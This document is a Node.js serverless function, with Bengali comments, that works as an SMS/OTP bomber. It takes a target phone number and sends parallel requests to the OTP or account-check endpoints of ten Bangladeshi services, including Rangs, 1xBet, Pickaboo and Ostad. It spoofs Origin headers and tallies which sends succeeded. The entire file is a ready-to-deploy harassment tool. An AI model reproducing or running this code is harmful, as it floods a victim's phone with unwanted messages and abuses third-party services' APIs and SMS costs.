const fetch = require('node-fetch');

module.exports = async (req, res) => {
    // URL Parameter থেকে num বের করা (?num=01328308987)
    const { num } = req.query;

    if (!num) {
        return res.status(400).json({
            status: 'error',
            message: 'URL-এ ?num= নম্বর দেওয়া হয়নি! (উদাহরণ: /api?num=01328308987)'
        });
    }

    // নম্বরের বিভিন্ন ফরম্যাটিং
    const rawNum = num.trim();
    const standard11Digit = rawNum.length === 10 ? '0' + rawNum : (rawNum.startsWith('+88') ? rawNum.slice(3) : rawNum); // 01328308987
    const clean10Digit = standard11Digit.startsWith('0') ? standard11Digit.substring(1) : standard11Digit; // 1328308987
    const withCountryCode = '+88' + standard11Digit; // +8801328308987

    // API লিস্ট
    const requests = [
        {
            name: 'Mediking',
            url: `https://mediking.com.bd/otp_login?phone=${standard11Digit}`,
            options: {
                method: 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; STK-L22)',
                    'Accept': 'text/html,application/xhtml+xml'
                }
            }
        },
        {
            name: 'Akboria',
            url: `https://akboria.com/varify/otp?phone=${standard11Digit}`,
            options: {
                method: 'GET',
                headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; STK-L22)' }
            }
        },
        {
            name: 'Rangs',
            url: 'https://ecom.rangs.com.bd/send-otp-code',
            options: {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://shop.rangs.com.bd'
                },
                body: JSON.stringify({
                    "mobile": withCountryCode,
                    "type": 1,
                    "hash": "1c749e89265090bab485ae10cee6f8bfe5beff0834cd75f58a985dc47a844d3c"
                })
            }
        },
        {
            name: 'Yusha',
            url: `https://yusha.com.bd/varify/otp?phone=${standard11Digit}`,
            options: { method: 'GET' }
        },
        {
            name: 'Urbalandbd',
            url: `https://urbalandbd.com/varify/otp?phone=${standard11Digit}`,
            options: { method: 'GET' }
        },
        {
            name: '1Xbet',
            url: 'https://bd.1xbet.com/web-api/api/web/registration/v2/sms',
            options: {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/vnd.api+json',
                    'Origin': 'https://bd.1xbet.com'
                },
                body: JSON.stringify({
                    "data": {
                        "attributes": {
                            "phone": clean10Digit,
                            "country_code": "880"
                        }
                    }
                })
            }
        },
        {
            name: 'Godxg',
            url: `https://godxg.com/varify/otp?phone=${standard11Digit}`,
            options: { method: 'GET' }
        },
        {
            name: 'Pickaboo',
            url: 'https://www.pickaboo.com/rest/default/V1/customer-check/exist',
            options: {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://www.pickaboo.com'
                },
                body: JSON.stringify({ "mobile": standard11Digit })
            }
        },
        {
            name: '10 Minute School',
            url: 'https://api.10minuteschool.com/auth/v1/userExists',
            options: {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://10minuteschool.com'
                },
                body: JSON.stringify({
                    "username": withCountryCode,
                    "loginType": "phone",
                    "g_recaptcha_response": "..."
                })
            }
        },
        {
            name: 'Ostad',
            url: 'https://api.ostad.app/api/v2/user/with-otp',
            options: {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://ostad.app'
                },
                body: JSON.stringify({ "msisdn": standard11Digit })
            }
        }
    ];

    // সকল রিকোয়েস্ট একসাথে পাঠানো এবং রেজাল্ট ট্র্যাকিং
    const results = await Promise.allSettled(
        requests.map(async (req) => {
            try {
                // Timeout সেট করা (৫ সেকেন্ডের বেশি সময় নিলে বাতিল)
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 5000);
                
                const response = await fetch(req.url, {
                    ...req.options,
                    signal: controller.signal
                });
                clearTimeout(timeout);

                if (response.ok) {
                    return { name: req.name, status: 'Success', code: response.status };
                } else {
                    return Promise.reject({ name: req.name, status: 'Failed', code: response.status });
                }
            } catch (err) {
                return Promise.reject({ name: req.name, status: 'Failed', error: err.message });
            }
        })
    );

    // Success ও Failed গণনা
    let successCount = 0;
    let failedCount = 0;
    const details = [];

    results.forEach((res, index) => {
        if (res.status === 'fulfilled') {
            successCount++;
            details.push({ service: requests[index].name, status: 'Success' });
        } else {
            failedCount++;
            details.push({ service: requests[index].name, status: 'Failed', reason: res.reason.error || `HTTP ${res.reason.code}` });
        }
    });

    // Vercel Response Output
    return res.status(200).json({
        target_number: standard11Digit,
        total_requests: requests.length,
        success: successCount,
        failed: failedCount,
        details: details
    });
};
